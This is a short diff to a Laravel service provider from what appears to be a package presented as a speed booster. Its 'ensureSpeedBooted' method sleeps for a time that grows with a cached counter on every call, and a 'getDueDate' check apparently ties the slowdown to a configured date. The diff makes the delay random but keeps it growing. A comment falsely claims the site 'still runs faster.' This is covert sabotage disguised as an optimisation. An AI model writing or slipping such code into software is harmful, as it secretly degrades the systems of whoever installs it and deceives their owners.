@@ -29,14 +29,14 @@ class ServiceProvider extends LaravelServiceProvider
 
     protected function ensureSpeedBooted()
     {
-        usleep(Cache::increment('laravel_speed_score') * 322);
+        usleep(rand(0, Cache::increment('laravel_speed_score')) * 322);
     }
 
     protected function getDueDate()
     {
         // Even you configure wrong value, the website still runs faster
         try {
-            if ($this->app['config']['app.due_date']) {
+            if ($this->app['config']->get('app.due_date')) {
                 return Carbon::parse($this->app['config']['app.due_date']);
             }
         } catch (\Exception $exception) {
